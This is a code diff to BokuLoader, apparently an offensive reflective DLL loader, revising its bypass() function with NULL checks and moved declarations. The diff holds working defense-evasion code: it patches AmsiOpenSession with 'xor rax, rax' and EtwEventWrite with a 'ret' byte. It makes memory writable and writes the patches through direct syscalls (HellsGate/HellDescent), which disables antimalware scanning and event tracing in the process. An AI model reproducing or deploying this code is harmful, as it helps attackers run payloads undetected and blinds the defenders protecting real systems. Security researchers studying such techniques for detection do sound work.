@@ -484,6 +484,11 @@ __declspec(dllexport) void* WINAPI BokuLoader()
 
 #ifdef BYPASS
 void bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA, DWORD NtProtSyscallNumber, DWORD NtWriteSyscallNumber){
+    PVOID Base;
+    SIZE_T Size;
+    unsigned long oldprotect;
+    SIZE_T bytesWritten;
+
     // ######### AMSI.AmsiOpenSession Bypass
     char as[] = {'a','m','s','i','.','d','l','l',0};
     Dll amsi;
@@ -491,44 +496,48 @@ void bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA, DWORD NtProtSysca
     if (amsi.dllBase == NULL){ // If the AMSI.DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
         amsi.dllBase = (void*)pLoadLibraryA((char*)(as));
     }
-    amsi.Export.Directory      = (void*)getExportDirectory(   (void*)amsi.dllBase);
-    amsi.Export.AddressTable   = (void*)getExportAddressTable((void*)amsi.dllBase, amsi.Export.Directory);
-    amsi.Export.NameTable      = (void*)getExportNameTable(   (void*)amsi.dllBase, amsi.Export.Directory);
-    amsi.Export.OrdinalTable   = (void*)getExportOrdinalTable((void*)amsi.dllBase, amsi.Export.Directory);
-    char aoses[] = {'A','m','s','i','O','p','e','n','S','e','s','s','i','o','n',0};
-    void* pAmsiOpenSession  = getSymbolAddress(aoses, (void*)15, amsi.dllBase, amsi.Export.AddressTable, amsi.Export.NameTable, amsi.Export.OrdinalTable);
 
-    SIZE_T bytesWritten;
-    unsigned long oldprotect = 0;
-    unsigned char amsibypass[] = { 0x48, 0x31, 0xC0 }; // xor rax, rax
-    PVOID Base = pAmsiOpenSession;
-    SIZE_T Size = sizeof(amsibypass);
-    // make memory region RWX
-    HellsGate((void*)(ULONG_PTR)NtProtSyscallNumber);
-    HellDescent((HANDLE)-1, &Base, &Size, PAGE_EXECUTE_READWRITE, &oldprotect);
-    // write the bypass
-    HellsGate((void*)(ULONG_PTR)NtWriteSyscallNumber);
-    HellDescent((HANDLE)-1, pAmsiOpenSession, amsibypass, sizeof(amsibypass), &bytesWritten);
-    // make memory region RX again
-    HellsGate((void*)(ULONG_PTR)NtProtSyscallNumber);
-    HellDescent((HANDLE)-1, &Base, &Size, oldprotect, &oldprotect);
+    if (amsi.dllBase != NULL) {
+        amsi.Export.Directory      = (void*)getExportDirectory(   (void*)amsi.dllBase);
+        amsi.Export.AddressTable   = (void*)getExportAddressTable((void*)amsi.dllBase, amsi.Export.Directory);
+        amsi.Export.NameTable      = (void*)getExportNameTable(   (void*)amsi.dllBase, amsi.Export.Directory);
+        amsi.Export.OrdinalTable   = (void*)getExportOrdinalTable((void*)amsi.dllBase, amsi.Export.Directory);
+        char aoses[] = {'A','m','s','i','O','p','e','n','S','e','s','s','i','o','n',0};
+        void* pAmsiOpenSession  = getSymbolAddress(aoses, (void*)15, amsi.dllBase, amsi.Export.AddressTable, amsi.Export.NameTable, amsi.Export.OrdinalTable);
+
+        
+        unsigned char amsibypass[] = { 0x48, 0x31, 0xC0 }; // xor rax, rax
+        Base = pAmsiOpenSession;
+        Size = sizeof(amsibypass);
+        // make memory region RWX
+        HellsGate((void*)(ULONG_PTR)NtProtSyscallNumber);
+        HellDescent((HANDLE)-1, &Base, &Size, PAGE_EXECUTE_READWRITE, &oldprotect);
+        // write the bypass
+        HellsGate((void*)(ULONG_PTR)NtWriteSyscallNumber);
+        HellDescent((HANDLE)-1, pAmsiOpenSession, amsibypass, sizeof(amsibypass), &bytesWritten);
+        // make memory region RX again
+        HellsGate((void*)(ULONG_PTR)NtProtSyscallNumber);
+        HellDescent((HANDLE)-1, &Base, &Size, oldprotect, &oldprotect);
+    }
 
     // ######### ETW.EtwEventWrite Bypass // Credit: @_xpn_ & @ajpc500 // https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/ & https://github.com/ajpc500/BOFs/blob/main/ETW/etw.c
     char eew[] = {'E','t','w','E','v','e','n','t','W','r','i','t','e',0};
     void* pEtwEventWrite  = getSymbolAddress(eew, (void*)13, ntdll->dllBase, ntdll->Export.AddressTable, ntdll->Export.NameTable, ntdll->Export.OrdinalTable);
 
-    unsigned char etwbypass[] = { 0xc3 }; // ret
-    Base = pEtwEventWrite;
-    Size = sizeof(etwbypass);
-    // make memory region RWX
-    HellsGate((void*)(ULONG_PTR)NtProtSyscallNumber);
-    HellDescent((HANDLE)-1, &Base, &Size, PAGE_EXECUTE_READWRITE, &oldprotect);
-    // write the bypass
-    HellsGate((void*)(ULONG_PTR)NtWriteSyscallNumber);
-    HellDescent((HANDLE)-1, pEtwEventWrite, etwbypass, sizeof(etwbypass), &bytesWritten);
-    // make memory region RX again
-    HellsGate((void*)(ULONG_PTR)NtProtSyscallNumber);
-    HellDescent((HANDLE)-1, &Base, &Size, oldprotect, &oldprotect);
+    if (pEtwEventWrite != NULL) {
+        unsigned char etwbypass[] = { 0xc3 }; // ret
+        Base = pEtwEventWrite;
+        Size = sizeof(etwbypass);
+        // make memory region RWX
+        HellsGate((void*)(ULONG_PTR)NtProtSyscallNumber);
+        HellDescent((HANDLE)-1, &Base, &Size, PAGE_EXECUTE_READWRITE, &oldprotect);
+        // write the bypass
+        HellsGate((void*)(ULONG_PTR)NtWriteSyscallNumber);
+        HellDescent((HANDLE)-1, pEtwEventWrite, etwbypass, sizeof(etwbypass), &bytesWritten);
+        // make memory region RX again
+        HellsGate((void*)(ULONG_PTR)NtProtSyscallNumber);
+        HellDescent((HANDLE)-1, &Base, &Size, oldprotect, &oldprotect);
+    }
 
     return;
 }
